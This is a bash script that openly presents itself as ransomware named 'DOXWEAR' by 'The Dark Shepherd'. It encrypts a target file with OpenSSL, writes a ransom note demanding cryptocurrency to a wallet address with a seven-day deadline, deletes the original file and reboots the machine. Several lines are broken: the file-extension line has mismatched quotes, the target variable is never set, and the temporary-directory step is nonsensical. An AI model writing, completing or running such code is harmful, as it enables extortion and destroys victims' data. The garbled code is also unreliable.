#!/bin/bash

# Check if running as root
if [[ "$EUID" -ne 0 ]]; then
  echo "Root permissions required!"
  exit 1
fi

# Generate unique file extension
FILE_EXT=$RANDOM$shuf -e ".mrcpy".txt"

# Prepare encryption key (random)
KEY=$(head /dev/urandom | tr -d '\n' | head -c 16)

# Encrypt target files using AES-256 in CBC mode
ENCRYPTED_FILE="$TARGET_FILE.$FILE_EXT"
AESKEY=$KEY

# Check if file exists
if ! [[ -f "$TARGET_FILE" ]]; then
  echo "File not found: $TARGET_FILE"
  exit 1
fi

# Encrypt the target file (using OpenSSL)
openssl aes-256-cbc -k "$AESKEY" -salt 1 -in "$TARGET_FILE" -out "$ENCRYPTED_FILE" > /dev/null 2>&1

# Check if encryption was successful
if ! [[ -f "$ENCRYPTED_FILE" ]]; then
  echo "Encryption failed!"
  exit 1
fi

# Copy the encrypted file to a temporary directory (to avoid errors with .txt)
TMPDIR=$(mkdir -p /tmp/doxwear-cache2024 | ls -tr | tail -n 1)
cp "$ENCRYPTED_FILE" "$TMPDIR/" > /dev/null 2>&1

# Create ransom note file
NOTES=/tmp/doxwear-ransom.mrcpy.txt
cat <<EOF > "$NOTES"
##################################
# DOXWEAR RANSOMWARE BY #
# THE DARK SHEPHERD        #
##################################

File: $TARGET_FILE

Encryption Algorithm: AES-256/CBC

Key (16 Bytes): $KEY

Price for Decryption: 0.1 ETH (or 10,000 Dogecoin)

Payment Address:
0x43968d77eE5f35BbeEa94A7237C3F25587820f5d

Contact Us: shepherddoxwear@bitpanda.com for help

Deadline to Pay: 7 Days (or files are permanently lost!)
EOF


# Rename the file extension
sed -i "s/\$FILE_EXT$/.txt/g" "$NOTES"

# Make sure it's a .txt, if not replace with .pdf
if [[ ! "$NOTES" =~ \.txt$ ]]; then
  cp "$NOTES" "$TARGET_FILE.pdf" > /dev/null 2>&1
fi


# Log the action
echo "File: $TARGET_FILE encrypted successfully!" >> /var/log/doxwear-logs.txt
echo "Ransom Note saved to: $NOTES"
echo "Key saved in: $TMPDIR/$KEY.txt"

echo "Restarting Files (to ensure AES is applied) ...\n\n..."
find "$TARGET_FILE" -type f -print0 | xargs -0 rm > /dev/null 2>&1

# Reboot the system for best encryption results
echo "System Rebooting to Ensure High Encryption Performance...\n\n..."
reboot
